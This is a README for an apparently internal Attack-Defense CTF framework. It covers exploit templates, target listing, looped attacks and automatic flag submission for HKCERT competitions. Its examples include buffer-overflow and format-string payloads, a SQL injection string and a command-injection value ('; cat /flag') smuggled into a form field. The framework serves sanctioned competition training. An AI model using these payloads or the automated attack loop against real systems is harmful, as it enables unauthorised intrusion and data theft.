# AWD CTF Exploit Framework

A simple, batteries-included framework for Attack-Defense CTF competitions.

## Quick Start

```bash
# For PWN challenges
cp pwn.py my_exploit.py
# Edit: Set BINARY, PORT, implement exploit()

# For Web challenges  
cp web.py my_exploit.py
# Edit: Set PORT, implement exploit()

# Run it
python3 my_exploit.py
```

## Installation

```bash
pip install pwntools requests
# Optional for xlsx support:
pip install openpyxl
```

## File Overview

| File | Purpose |
|------|---------|
| `awd_lib.py` | Core AWD library (targets, submit, discord) |
| `pwn_lib.py` | PWN utilities (packing, IO, GDB debugging) |
| `pwn.py` | PWN exploit template |
| `web.py` | Web exploit template |

## Configuration

### Option 1: Edit awd_lib.py directly

Edit the configuration section at the top of `awd_lib.py`:

```python
API_URL = "https://platform.ctf.hkcert.org/api/..."
TOKEN = "your_token_here"
CREDS_FILE = "mqda.csv"
PEM_URL = "http://10.30.16.251/..."
```

### Option 2: Use chal() function

```python
from awd_lib import chal

chal(
    creds_file="mqda.csv",
    api_url="https://...",
    token="your_token",
    discord_host="192.168.1.100",  # Optional
    discord_port=4545,
)
```

## Usage

### Running Exploits

```bash
# AWD mode - attack targets
python3 my_exploit.py              # All targets once
python3 my_exploit.py 172.24.84.11 # Specific IP
python3 my_exploit.py --loop       # Run continuously
python3 my_exploit.py --info       # Show competition info
python3 my_exploit.py --targets    # List all targets
python3 my_exploit.py --ssh        # Get SSH command

# Development mode (PWN only)
python3 my_exploit.py local        # Test locally
python3 my_exploit.py debug        # Debug with GDB
```

### Writing PWN Exploits

```python
from pwn_lib import *
from awd_lib import *

BINARY = "./vuln"
LIBC = "./libc.so.6"  # Optional
PORT = 9999

# Uncomment for local testing
# bin, rop, libc = setup_binary(BINARY, LIBC)
# add_breakpoint('main', 'vuln+32')

def exploit(ip, port):
    """AWD mode - return flag or None."""
    try:
        io = remote(ip, port)
        s = shortcuts(io)
        
        # Your exploit
        payload = b"A" * 64 + p64(win_addr)
        s.sla(b"> ", payload)
        flag = s.ru(b"}")
        
        io.close()
        return flag
    except:
        return None

def exploit_dev(io):
    """Development mode - for local/debug testing."""
    s = shortcuts(io)
    # Same exploit logic
    io.interactive()
```

### Writing Web Exploits

```python
import requests
from awd_lib import *

PORT = 8080

def exploit(ip, port):
    """Return flag or None."""
    try:
        url = f"http://{ip}:{port}"
        
        # SQL injection example
        r = requests.get(f"{url}/api?id=' UNION SELECT flag FROM flags--")
        return extract_flag(r.text)
    except:
        return None

def extract_flag(text):
    """Extract flag from response."""
    import re
    match = re.search(r'hkcert\d{2}\{[^}]+\}', text)
    return match.group(0) if match else None
```

## API Reference

### Core Functions (awd_lib)

| Function | Description |
|----------|-------------|
| `setup_auth()` | Download PEM file and set permissions (600) |
| `targets()` | Get target IPs (excludes your own IP automatically) |
| `our_ip()` | Get your team's IP address |
| `submit(flag)` | Submit flag to scoring server |
| `ssh_command(ip)` | Get SSH command string |

### PWN Utilities (pwn_lib)

| Function | Description |
|----------|-------------|
| `setup_binary(path, libc)` | Setup ELF and ROP objects |
| `add_breakpoint(*bp)` | Add GDB breakpoints |
| `get_io(mode, ip, port)` | Get process/remote IO |
| `shortcuts(io)` | Get IO shortcut helper |
| `p64/p32/u64/u32` | Packing utilities |
| `uu64/uu32` | Padded unpack (handles short data) |
| `leak_addr(io, prefix)` | Receive and unpack leaked address |

### IO Shortcuts

```python
s = shortcuts(io)
s.sla(delim, data)  # sendlineafter
s.sa(delim, data)   # sendafter
s.sl(data)          # sendline
s.sd(data)          # send
s.rl()              # recvline
s.ru(delim)         # recvuntil
s.rc(n)             # recv
s.ia()              # interactive
```

### Discord Logging

```python
from awd_lib import discord

discord.configure("192.168.1.100", 4545)
discord.info("Starting round")
discord.success("Got shell!", target=ip)
discord.error("Failed", exc=e)
discord.flag("Captured!", flag=flag, target=ip)
discord.pwned(ip, flag=flag)
```

## Examples

### Buffer Overflow (PWN)

```python
def exploit(ip, port):
    try:
        io = remote(ip, port)
        s = shortcuts(io)
        
        payload = b"A" * 64
        payload += p64(0x401337)  # win function
        
        s.sla(b"> ", payload)
        s.ru(b"flag{")
        flag = b"flag{" + s.ru(b"}")
        
        io.close()
        return flag
    except:
        return None
```

### Format String Leak (PWN)

```python
def exploit(ip, port):
    try:
        io = remote(ip, port)
        s = shortcuts(io)
        
        # Leak addresses
        s.sla(b"> ", b"%p " * 20)
        leaks = s.rl().split()
        
        # Parse leak
        libc_leak = int(leaks[5], 16)
        libc.address = libc_leak - libc.sym['__libc_start_main']
        
        # ... rest of exploit
    except:
        return None
```

### SQL Injection (Web)

```python
def exploit(ip, port):
    try:
        url = f"http://{ip}:{port}"
        r = requests.get(f"{url}/user?id=' UNION SELECT flag FROM flags--")
        return extract_flag(r.text)
    except:
        return None
```

### Command Injection (Web)

```python
def exploit(ip, port):
    try:
        url = f"http://{ip}:{port}"
        r = requests.post(f"{url}/ping", data={"host": "; cat /flag"})
        return extract_flag(r.text)
    except:
        return None
```

## Tips

1. **Test locally first**: `python3 exploit.py local` or `debug`
2. **Check targets**: `python3 exploit.py --info`
3. **Use loop mode**: `python3 exploit.py --loop` during competition
4. **One vuln per file**: Keep exploits simple and focused
5. **Handle exceptions**: Always return `None` on failure

## Troubleshooting

### "Permission denied" for PEM file
```bash
# Framework handles this, but if needed:
chmod 600 auth.pem
```

### "Credentials file not found"
```python
chal(creds_file="/path/to/creds.csv")
```

### GDB not attaching
```python
# Check terminal setting in pwn_lib.py
context.terminal = ["konsole", "-e"]  # or ["tmux", "splitw", "-h"]
```

## Credits

PWN template based on work by ZD (former helper and PWN player) and many PWN players.

## License

Internal use for HKCERT CTF competitions.
